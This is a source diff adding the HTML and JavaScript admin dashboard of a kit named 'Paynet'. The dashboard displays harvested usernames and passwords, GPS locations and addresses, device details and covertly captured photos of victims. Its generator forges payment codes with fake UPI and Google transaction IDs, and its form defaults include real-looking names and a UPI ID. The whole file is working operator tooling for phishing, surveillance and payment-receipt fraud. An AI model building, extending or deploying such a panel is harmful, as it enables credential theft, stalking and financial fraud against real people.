@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paynet · Admin Dashboard</title>
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="alternate icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/admin.css">
+</head>
+
+<body>
+
+    <!-- Mobile Sidebar Overlay -->
+    <div class="sidebar-overlay" id="sidebar-overlay" onclick="closeSidebar()"></div>
+
+    <div class="app-layout">
+
+        <!-- ===== Sidebar ===== -->
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-brand">
+                <div class="brand-icon">💳</div>
+                <div>
+                    <h1>Paynet</h1>
+                    <span>Admin Panel</span>
+                </div>
+            </div>
+
+            <nav class="sidebar-nav">
+                <div class="nav-label">Overview</div>
+                <div class="nav-item active" onclick="switchTab('dashboard')" id="nav-dashboard">
+                    <span class="nav-icon">📊</span>
+                    Dashboard
+                </div>
+
+                <div class="nav-label">Tools</div>
+                <div class="nav-item" onclick="switchTab('generator')" id="nav-generator">
+                    <span class="nav-icon">🔗</span>
+                    Payment Generator
+                </div>
+
+                <div class="nav-label">System</div>
+                <div class="nav-item" onclick="switchTab('settings')" id="nav-settings">
+                    <span class="nav-icon">⚙️</span>
+                    Settings
+                </div>
+            </nav>
+
+            <div class="sidebar-footer">
+                <a href="/admin-logout" class="logout-btn">
+                    <span>🚪</span>
+                    Logout
+                </a>
+            </div>
+        </aside>
+
+        <!-- ===== Main Content ===== -->
+        <main class="main-content">
+
+            <!-- Top Bar -->
+            <header class="top-bar">
+                <div class="top-bar-left">
+                    <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
+                    <div class="page-title" id="page-title">Dashboard <span>· Overview</span></div>
+                </div>
+                <div class="top-bar-right">
+                    <div class="status-dot"></div>
+                    <div class="admin-chip">
+                        🛡️ Admin
+                    </div>
+                </div>
+            </header>
+
+            <!-- Page Content -->
+            <div class="page-content">
+
+                <!-- ============ DASHBOARD VIEW ============ -->
+                <div id="view-dashboard" class="tab-view active">
+
+                    <!-- Stats -->
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <div class="stat-icon-wrap">📋</div>
+                            <div class="stat-info">
+                                <h3 id="total-attempts">0</h3>
+                                <p>Total Attempts</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon-wrap">📸</div>
+                            <div class="stat-info">
+                                <h3 id="total-photos">0</h3>
+                                <p>Photos Captured</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon-wrap">🌍</div>
+                            <div class="stat-info">
+                                <h3 id="total-locations">0</h3>
+                                <p>Unique Locations</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon-wrap">🕐</div>
+                            <div class="stat-info">
+                                <h3 id="latest-time">—</h3>
+                                <p>Latest Activity</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Login Attempts Table -->
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><span class="icon">📋</span> Login Attempts</h2>
+                            <div class="card-header-actions">
+                                <button onclick="refreshData()" class="btn">🔄 Refresh</button>
+                            </div>
+                        </div>
+                        <div class="card-body no-padding">
+                            <div class="table-wrap">
+                                <table>
+                                    <thead>
+                                        <tr>
+                                            <th>Verification ID</th>
+                                            <th>Status</th>
+                                            <th>Time</th>
+                                            <th>User / IP</th>
+                                            <th>Location</th>
+                                            <th>Device</th>
+                                            <th>Credentials</th>
+                                            <th>Photo</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="attempts-tbody">
+                                        <tr>
+                                            <td colspan="8">
+                                                <div class="empty-state">
+                                                    <div class="empty-icon">⏳</div>
+                                                    <p>Loading data...</p>
+                                                </div>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Photo Gallery -->
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><span class="icon">📸</span> Captured Photos</h2>
+                            <div class="card-header-actions">
+                                <button onclick="deleteAllPhotos()" class="btn btn-danger btn-sm">🗑️ Delete
+                                    All</button>
+                                <button onclick="downloadAllPhotos()" class="btn btn-sm">⬇️ Download All</button>
+                            </div>
+                        </div>
+                        <div class="card-body">
+                            <div class="photo-grid" id="photo-gallery">
+                                <div class="empty-state" style="grid-column: 1 / -1;">
+                                    <div class="empty-icon">📷</div>
+                                    <p>No photos captured yet</p>
+                                    <small>Photos will appear here once captured</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Location Map -->
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><span class="icon">🗺️</span> Location Map</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="map-wrap" id="map-container">
+                                <iframe id="location-map" width="100%" height="420" allowfullscreen></iframe>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ============ GENERATOR VIEW ============ -->
+                <div id="view-generator" class="tab-view">
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><span class="icon">🔗</span> Create Custom Payment Code</h2>
+                        </div>
+                        <div class="card-body">
+                            <form id="payment-form" onsubmit="createPaymentLink(event)" class="form-grid">
+
+                                <div class="form-group full-width">
+                                    <label class="form-label">💰 Payment Amount</label>
+                                    <input type="text" id="gen-amount" value="1,600" required class="form-input"
+                                        placeholder="Enter amount">
+                                </div>
+
+                                <div class="form-group">
+                                    <label class="form-label">👤 Paid To (Receiver)</label>
+                                    <input type="text" id="gen-to" value="Deepak Anna Bodke" required class="form-input"
+                                        placeholder="Receiver name">
+                                </div>
+
+                                <div class="form-group">
+                                    <label class="form-label">👤 Paid By (Sender)</label>
+                                    <input type="text" id="gen-from" value="NOUFIYA J" required class="form-input"
+                                        placeholder="Sender name">
+                                </div>
+
+                                <div class="form-group">
+                                    <label class="form-label">🏦 Bank Name</label>
+                                    <input type="text" id="gen-bank" value="Canara Bank 2461" required
+                                        class="form-input" placeholder="e.g. SBI, HDFC">
+                                </div>
+
+                                <div class="form-group">
+                                    <label class="form-label">📱 UPI ID</label>
+                                    <input type="text" id="gen-upi" value="gpay-12192992016@okbizaxis" required
+                                        class="form-input" placeholder="e.g. user@upi">
+                                </div>
+
+                                <div class="form-group">
+                                    <label class="form-label">🔢 UPI Txn ID</label>
+                                    <input type="text" id="gen-upi-txn" value="604456031510" class="form-input"
+                                        placeholder="Enter UPI Txn ID">
+                                </div>
+
+                                <div class="form-group">
+                                    <label class="form-label">🔖 Google Txn ID</label>
+                                    <input type="text" id="gen-google-txn" value="CICAgJil3_rfbQ" class="form-input"
+                                        placeholder="Auto-generated if empty">
+                                </div>
+
+                                <div class="form-group full-width">
+                                    <label class="form-label">📅 Custom Date</label>
+                                    <input type="text" id="gen-date" value="13 Feb 2026, 8:03 pm" class="form-input"
+                                        placeholder="Leave empty for current">
+                                </div>
+
+                                <div class="form-group full-width">
+                                    <button type="submit" class="btn btn-primary"
+                                        style="justify-content: center; padding: 12px;">
+                                        🚀 Generate Code
+                                    </button>
+                                </div>
+                            </form>
+
+                            <!-- Generated Result -->
+                            <div id="generated-result" class="gen-result">
+                                <p
+                                    style="color: var(--text-muted); font-size: 0.82rem; margin-bottom: 12px; font-weight: 500;">
+                                    Generated Payment Code</p>
+                                <div class="gen-code-box">
+                                    <span class="gen-code" id="gen-id-display">—</span>
+                                    <button onclick="copyGenID()" class="btn btn-primary btn-sm">📋 Copy</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ============ SETTINGS VIEW ============ -->
+                <div id="view-settings" class="tab-view">
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><span class="icon">⚙️</span> Paynet Configuration</h2>
+                        </div>
+                        <div class="card-body">
+                            <form action="/admin/api/settings" method="POST"
+                                style="max-width: 560px; display: flex; flex-direction: column; gap: 20px;">
+
+                                <div class="form-group">
+                                    <label class="form-label">💰 Payment Amount</label>
+                                    <input type="text" name="paymentAmount" value="{{settings.paymentAmount}}"
+                                        class="form-input" placeholder="e.g. 500.00">
+                                </div>
+
+                                <div class="form-group">
+                                    <label class="form-label">💱 Currency Symbol</label>
+                                    <input type="text" name="currencySymbol" value="{{settings.currencySymbol}}"
+                                        class="form-input" placeholder="e.g. ₹">
+                                </div>
+
+                                <div class="form-group">
+                                    <label class="form-check">
+                                        <input type="checkbox" name="enableAnimation" {{#if
+                                            settings.enableAnimation}}checked{{/if}}>
+                                        <span>Enable Payment Animation</span>
+                                    </label>
+                                </div>
+
+                                <button type="submit" class="btn btn-primary"
+                                    style="justify-content: center; padding: 12px;">
+                                    💾 Save Settings
+                                </button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </main>
+    </div>
+
+    <!-- Lightbox -->
+    <div id="lightbox" class="lightbox" onclick="closeLightbox()">
+        <span class="lightbox-close">&times;</span>
+        <img id="lightbox-img" src="" alt="Photo">
+        <div id="lightbox-caption" class="lightbox-caption"></div>
+        <button id="lightbox-delete-btn" class="lightbox-delete-btn"
+            onclick="event.stopPropagation(); deletePhotoFromLightbox()">🗑️ Delete Photo</button>
+    </div>
+
+    <script>
+        let attemptsData = [];
+
+        // ===== Load data on page load =====
+        window.addEventListener('load', () => {
+            loadData();
+        });
+
+        async function loadData() {
+            try {
+                const response = await fetch('/admin/api/data');
+                const data = await response.json();
+                attemptsData = data.attempts || [];
+
+                updateStats(data);
+                renderAttemptsTable(attemptsData);
+                renderPhotoGallery(data.photos || []);
+                updateMap(attemptsData);
+            } catch (error) {
+                console.error('Error loading data:', error);
+            }
+        }
+
+        function updateStats(data) {
+            animateNumber('total-attempts', data.attempts.length);
+            animateNumber('total-photos', data.photos.length);
+
+            // Count unique locations
+            const uniqueLocations = new Set(
+                data.attempts
+                    .map(a => {
+                        if (a.location) {
+                            try {
+                                const locData = typeof a.location === 'string' ? JSON.parse(a.location) : a.location;
+                                if (locData.finalLocation && locData.finalLocation.latitude) {
+                                    return `${locData.finalLocation.latitude.toFixed(4)},${locData.finalLocation.longitude.toFixed(4)}`;
+                                }
+                            } catch (e) { }
+                        }
+                        if (a.gpsLocation && a.gpsLocation.latitude) {
+                            return `${a.gpsLocation.latitude},${a.gpsLocation.longitude}`;
+                        }
+                        return null;
+                    })
+                    .filter(l => l !== null)
+            ).size;
+            animateNumber('total-locations', uniqueLocations);
+
+            if (data.attempts.length > 0) {
+                const latest = new Date(data.attempts[0].timestamp);
+                document.getElementById('latest-time').textContent = formatRelativeTime(latest);
+            }
+        }
+
+        // Animate number counting up
+        function animateNumber(elementId, target) {
+            const el = document.getElementById(elementId);
+            const duration = 600;
+            const start = parseInt(el.textContent) || 0;
+            const startTime = performance.now();
+
+            function update(currentTime) {
+                const elapsed = currentTime - startTime;
+                const progress = Math.min(elapsed / duration, 1);
+                const eased = 1 - Math.pow(1 - progress, 3); // ease-out cubic
+                el.textContent = Math.round(start + (target - start) * eased);
+                if (progress < 1) requestAnimationFrame(update);
+            }
+            requestAnimationFrame(update);
+        }
+
+        // ===== Render Table =====
+        function renderAttemptsTable(attempts) {
+            const tbody = document.getElementById('attempts-tbody');
+
+            if (attempts.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="8">
+                    <div class="empty-state">
+                        <div class="empty-icon">📭</div>
+                        <p>No login attempts recorded</p>
+                        <small>Attempts will appear here once users interact</small>
+                    </div></td></tr>`;
+                return;
+            }
+
+            tbody.innerHTML = attempts.map((attempt, index) => {
+                const dateObj = new Date(attempt.timestamp);
+                const time = dateObj.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+                const date = dateObj.toLocaleDateString([], { day: '2-digit', month: 'short' });
+                const location = getLocationString(attempt);
+                const device = getDeviceString(attempt);
+                const photoFilename = attempt.photoFilename || getPhotoFilename(attempt.timestamp, attempt.ip);
+                const status = attempt.status || 'Verified';
+                const statusClass = status === 'Verified' ? 'badge-success' : 'badge-warning';
+
+                return `
+                    <tr>
+                        <td>
+                            <div class="cell-id">${attempt.verificationId || '—'}</div>
+                            <div class="cell-meta">Amazon Pay</div>
+                        </td>
+                        <td>
+                            <span class="badge ${statusClass}">
+                                <span class="badge-dot"></span>
+                                ${status}
+                            </span>
+                            <div class="cell-meta" style="margin-top:4px">${attempt.amount || '₹0.00'}</div>
+                        </td>
+                        <td>
+                            <div class="cell-strong">${time}</div>
+                            <div class="cell-meta">${date}</div>
+                        </td>
+                        <td>
+                            <div class="cell-strong">${escapeHtml(attempt.username || 'Unknown')}</div>
+                            <div class="cell-meta">${attempt.ip || '—'}</div>
+                        </td>
+                        <td>${location}</td>
+                        <td>${device}</td>
+                        <td>
+                            <div class="cred-wrap">
+                                <div class="cred-row">
+                                    <span class="cred-label">U</span>
+                                    <span class="cred-value masked" id="user-${index}"
+                                          data-value="${escapeHtml(attempt.username || '')}">${maskString(attempt.username || '')}</span>
+                                </div>
+                                <div class="cred-row">
+                                    <span class="cred-label">P</span>
+                                    <span class="cred-value masked" id="pass-${index}"
+                                          data-value="${escapeHtml(attempt.password || '')}">${maskString(attempt.password || '')}</span>
+                                </div>
+                                <button onclick="toggleCredentials(${index})" class="reveal-btn" id="btn-${index}">👁️ Show</button>
+                            </div>
+                        </td>
+                        <td>
+                            ${attempt.photoData ?
+                        `<button onclick="viewPhoto('${photoFilename}')" class="btn btn-success btn-sm">📷 View</button>
+                             <button onclick="deletePhoto('${photoFilename}')" class="btn btn-danger btn-sm btn-icon" style="margin-left:4px">🗑️</button>` :
+                        '<span style="color: var(--text-muted); font-size: 0.8rem;">—</span>'}
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        // ===== Photo Gallery =====
+        function renderPhotoGallery(photos) {
+            const gallery = document.getElementById('photo-gallery');
+
+            if (photos.length === 0) {
+                gallery.innerHTML = `<div class="empty-state" style="grid-column: 1 / -1;">
+                    <div class="empty-icon">📷</div>
+                    <p>No photos captured yet</p>
+                    <small>Photos will appear here once captured</small>
+                </div>`;
+                return;
+            }
+
+            gallery.innerHTML = photos.map(photo => `
+                <div class="photo-card" onclick="viewPhoto('${photo.filename}')">
+                    <img src="/admin/photo/${photo.filename}" alt="Captured" loading="lazy">
+                    <div class="photo-actions">
+                        <span class="photo-name">${photo.filename}</span>
+                        <button onclick="event.stopPropagation(); deletePhoto('${photo.filename}');"
+                                class="photo-del-btn" title="Delete">🗑️</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // ===== Tab Navigation =====
+        function switchTab(tabName) {
+            // Hide all views, show target
+            document.querySelectorAll('.tab-view').forEach(el => el.classList.remove('active'));
+            document.getElementById('view-' + tabName).classList.add('active');
+
+            // Update nav active state
+            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+            document.getElementById('nav-' + tabName).classList.add('active');
+
+            // Update page title
+            const titles = {
+                dashboard: 'Dashboard <span>· Overview</span>',
+                generator: 'Payment Generator <span>· Create Codes</span>',
+                settings: 'Settings <span>· Configuration</span>'
+            };
+            document.getElementById('page-title').innerHTML = titles[tabName] || tabName;
+
+            // Close mobile sidebar
+            closeSidebar();
+        }
+
+        // ===== Sidebar Mobile =====
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('sidebar-overlay').classList.toggle('show');
+        }
+
+        function closeSidebar() {
+            document.getElementById('sidebar').classList.remove('open');
+            document.getElementById('sidebar-overlay').classList.remove('show');
+        }
+
+        // ===== Map =====
+        function updateMap(attempts) {
+            const validLocations = [];
+            attempts.forEach(a => {
+                let loc = null;
+                if (a.location) {
+                    try {
+                        const locData = typeof a.location === 'string' ? JSON.parse(a.location) : a.location;
+                        if (locData.finalLocation && locData.finalLocation.latitude) {
+                            loc = locData.finalLocation;
+                        }
+                    } catch (e) { }
+                }
+                if (!loc && a.gpsLocation && a.gpsLocation.latitude) {
+                    loc = a.gpsLocation;
+                }
+                if (loc) validLocations.push({ gpsLocation: loc });
+            });
+
+            if (validLocations.length === 0) {
+                document.getElementById('map-container').innerHTML =
+                    `<div class="empty-state">
+                        <div class="empty-icon">🗺️</div>
+                        <p>No GPS locations captured yet</p>
+                    </div>`;
+                return;
+            }
+
+            const center = validLocations[0].gpsLocation;
+            const mapUrl = `https://maps.google.com/maps?q=${center.latitude},${center.longitude}&z=10&output=embed`;
+            document.getElementById('location-map').src = mapUrl;
+        }
+
+        // ===== Location String Builder =====
+        function getLocationString(attempt) {
+            let html = '';
+            let hasLocation = false;
+
+            if (attempt.location && attempt.location.finalLocation && attempt.location.finalLocation.coords) {
+                const coords = attempt.location.finalLocation.coords;
+                hasLocation = true;
+                html += `<div class="loc-wrap">`;
+                html += `<div class="loc-coords">${coords.latitude.toFixed(6)}°N, ${coords.longitude.toFixed(6)}°E</div>`;
+                html += `<div class="cell-meta">±${Math.round(coords.accuracy || 0)}m accuracy</div>`;
+                if (attempt.location.finalLocation.address) {
+                    const addr = attempt.location.finalLocation.address;
+                    html += `<div class="loc-address">${addr.fullAddress || formatDetailedAddress(addr)}</div>`;
+                } else if (attempt.location.address) {
+                    const addr = attempt.location.address;
+                    html += `<div class="loc-address">${addr.fullAddress || formatDetailedAddress(addr)}</div>`;
+                }
+                html += `<div class="loc-source">${attempt.location.captureMethod || 'GPS'}</div>`;
+                html += `<a href="https://www.google.com/maps?q=${coords.latitude},${coords.longitude}" target="_blank" class="map-link-btn">🗺️ Open Map</a>`;
+                html += `</div>`;
+            }
+            else if (attempt.location && attempt.location.latitude && attempt.location.longitude) {
+                hasLocation = true;
+                html += `<div class="loc-wrap">`;
+                html += `<div class="loc-coords">${attempt.location.latitude.toFixed(6)}°N, ${attempt.location.longitude.toFixed(6)}°E</div>`;
+                html += `<div class="cell-meta">±${Math.round(attempt.location.accuracy || 0)}m</div>`;
+                if (attempt.location.address) {
+                    const addr = attempt.location.address;
+                    html += `<div class="loc-address">${addr.fullAddress || formatDetailedAddress(addr)}</div>`;
+                }
+                html += `<a href="https://www.google.com/maps?q=${attempt.location.latitude},${attempt.location.longitude}" target="_blank" class="map-link-btn">🗺️ Open Map</a>`;
+                html += `</div>`;
+            }
+            else if (attempt.gpsLocation && attempt.gpsLocation.latitude) {
+                hasLocation = true;
+                html += `<div class="loc-wrap">`;
+                html += `<div class="loc-coords">${attempt.gpsLocation.latitude.toFixed(6)}°N, ${attempt.gpsLocation.longitude.toFixed(6)}°E</div>`;
+                html += `<div class="cell-meta">±${Math.round(attempt.gpsLocation.accuracy || 0)}m</div>`;
+                html += `<a href="https://www.google.com/maps?q=${attempt.gpsLocation.latitude},${attempt.gpsLocation.longitude}" target="_blank" class="map-link-btn">🗺️ Open Map</a>`;
+                html += `</div>`;
+            }
+
+            if (attempt.geo && attempt.geo.city) {
+                if (hasLocation) html += `<div class="loc-ip-section">`;
+                else html += `<div class="loc-wrap">`;
+                html += `<div class="cell-meta" style="font-weight:500;color:var(--text-secondary)">🌐 ${attempt.geo.city}`;
+                if (attempt.geo.region) html += `, ${attempt.geo.region}`;
+                html += `</div>`;
+                html += `<div class="cell-meta">${attempt.geo.country || ''}</div>`;
+                if (attempt.geo.isp) html += `<div class="cell-meta">ISP: ${attempt.geo.isp}</div>`;
+                if (attempt.geo.latitude && attempt.geo.longitude && !hasLocation) {
+                    html += `<a href="https://www.google.com/maps?q=${attempt.geo.latitude},${attempt.geo.longitude}" target="_blank" class="map-link-btn">🗺️ Open Map (IP)</a>`;
+                }
+                html += `</div>`;
+                hasLocation = true;
+
+            }
+
+            if (!hasLocation) {
+                html = '<span style="color: var(--text-muted); font-size: 0.8rem;">—</span>';
+            }
+
+            return html;
+        }
+
+        function formatDetailedAddress(addr) {
+            const parts = [];
+            if (addr.houseNumber && addr.road) parts.push(`${addr.houseNumber} ${addr.road}`);
+            else if (addr.road) parts.push(addr.road);
+            if (addr.neighborhood) parts.push(addr.neighborhood);
+            if (addr.city || addr.town || addr.village) parts.push(addr.city || addr.town || addr.village);
+            if (addr.state) parts.push(addr.state);
+            if (addr.postcode) parts.push(addr.postcode);
+            if (addr.country) parts.push(addr.country);
+            return parts.join(', ');
+        }
+
+        function getDeviceString(attempt) {
+            if (!attempt.deviceDetails) return '<span style="color: var(--text-muted); font-size: 0.8rem;">—</span>';
+            const d = attempt.deviceDetails;
+            return `<div class="cell-strong">${d.platform || 'Unknown'}</div><div class="cell-meta">${d.screenResolution || ''}</div>`;
+        }
+
+        // ===== Credentials =====
+        function maskString(str) {
+            if (!str) return '';
+            return '•'.repeat(Math.min(str.length, 16));
+        }
+
+        function escapeHtml(str) {
+            if (!str) return '';
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+
+        function toggleCredentials(index) {
+            const userSpan = document.getElementById(`user-${index}`);
+            const passSpan = document.getElementById(`pass-${index}`);
+            const btn = document.getElementById(`btn-${index}`);
+            if (!userSpan || !passSpan) return;
+
+            const isMasked = userSpan.classList.contains('masked');
+            if (isMasked) {
+                userSpan.textContent = userSpan.dataset.value;
+                passSpan.textContent = passSpan.dataset.value;
+                userSpan.classList.remove('masked');
+                passSpan.classList.remove('masked');
+                btn.textContent = '🙈 Hide';
+            } else {
+                userSpan.textContent = maskString(userSpan.dataset.value);
+                passSpan.textContent = maskString(passSpan.dataset.value);
+                userSpan.classList.add('masked');
+                passSpan.classList.add('masked');
+                btn.textContent = '👁️ Show';
+            }
+        }
+
+        // ===== Photo Actions =====
+        async function deletePhoto(filename) {
+            if (!confirm(`Delete ${filename}?`)) return;
+            try {
+                const response = await fetch(`/admin/photo/delete/${filename}`, { method: 'DELETE' });
+                const result = await response.json();
+                if (result.success) {
+                    showToast('Photo deleted successfully', 'success');
+                    loadData();
+                } else {
+                    showToast('Failed to delete photo', 'error');
+                }
+            } catch (error) {
+                showToast('Error deleting photo', 'error');
+            }
+        }
+
+        async function deleteAllPhotos() {
+            if (!confirm('Delete ALL photos? This cannot be undone!')) return;
+            try {
+                const response = await fetch('/admin/photo/delete-all', { method: 'DELETE' });
+                const result = await response.json();
+                if (result.success) {
+                    showToast(`Deleted ${result.count} photo(s)`, 'success');
+                    loadData();
+                } else {
+                    showToast('Failed to delete photos', 'error');
+                }
+            } catch (error) {
+                showToast('Error deleting photos', 'error');
+            }
+        }
+
+        function downloadAllPhotos() {
+            showToast('Download feature coming soon', 'success');
+        }
+
+        // ===== Lightbox =====
+        let currentPhotoFilename = null;
+
+        function viewPhoto(filename) {
+            currentPhotoFilename = filename;
+            document.getElementById('lightbox-img').src = `/admin/photo/${filename}`;
+            document.getElementById('lightbox-caption').textContent = filename;
+            document.getElementById('lightbox').style.display = 'flex';
+        }
+
+        function closeLightbox() {
+            document.getElementById('lightbox').style.display = 'none';
+            currentPhotoFilename = null;
+        }
+
+        async function deletePhotoFromLightbox() {
+            if (!currentPhotoFilename) return;
+            closeLightbox();
+            await deletePhoto(currentPhotoFilename);
+        }
+
+        function getPhotoFilename(timestamp, ip) {
+            const date = new Date(timestamp).toISOString().replace(/:/g, '-');
+            const cleanIp = (ip || '').replace(/[.:]/g, '-');
+            return `${date}_${cleanIp}.jpg`;
+        }
+
+        // ===== Toast =====
+        function showToast(msg, type = 'success') {
+            const existing = document.querySelector('.toast');
+            if (existing) existing.remove();
+
+            const toast = document.createElement('div');
+            toast.className = `toast toast-${type}`;
+            toast.innerHTML = `${type === 'success' ? '✅' : '❌'} ${msg}`;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+
+        // ===== Utilities =====
+        function refreshData() { loadData(); }
+
+        function formatRelativeTime(date) {
+            const seconds = Math.floor((new Date() - date) / 1000);
+            if (seconds < 60) return `${seconds}s ago`;
+            const minutes = Math.floor(seconds / 60);
+            if (minutes < 60) return `${minutes}m ago`;
+            const hours = Math.floor(minutes / 60);
+            if (hours < 24) return `${hours}h ago`;
+            const days = Math.floor(hours / 24);
+            return `${days}d ago`;
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeLightbox();
+        });
+
+        // ===== Payment Generator =====
+        async function createPaymentLink(e) {
+            e.preventDefault();
+            const btn = e.target.querySelector('button[type="submit"]');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '⏳ Generating...';
+            btn.disabled = true;
+
+            const data = {
+                amount: document.getElementById('gen-amount').value,
+                toName: document.getElementById('gen-to').value,
+                fromName: document.getElementById('gen-from').value,
+                bankName: document.getElementById('gen-bank').value,
+                upiId: document.getElementById('gen-upi').value,
+                upiTxnId: document.getElementById('gen-upi-txn').value,
+                googleTxnId: document.getElementById('gen-google-txn').value,
+                customDate: document.getElementById('gen-date').value
+            };
+
+            try {
+                const response = await fetch('/admin/api/generate-payment', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+
+                if (result.success) {
+                    document.getElementById('generated-result').style.display = 'block';
+                    document.getElementById('gen-id-display').textContent = result.payment.id;
+                    showToast('Payment code generated!', 'success');
+                    btn.innerHTML = '✅ Created!';
+                    setTimeout(() => {
+                        btn.innerHTML = originalText;
+                        btn.disabled = false;
+                    }, 2000);
+                } else {
+                    showToast('Error: ' + result.error, 'error');
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                }
+            } catch (error) {
+                showToast('Failed to generate payment link', 'error');
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }
+        }
+
+        function copyGenID() {
+            const id = document.getElementById('gen-id-display').textContent.trim();
+            navigator.clipboard.writeText(id).then(() => {
+                showToast('Code copied to clipboard', 'success');
+            });
+        }
+    </script>
+</body>
+
+</html>
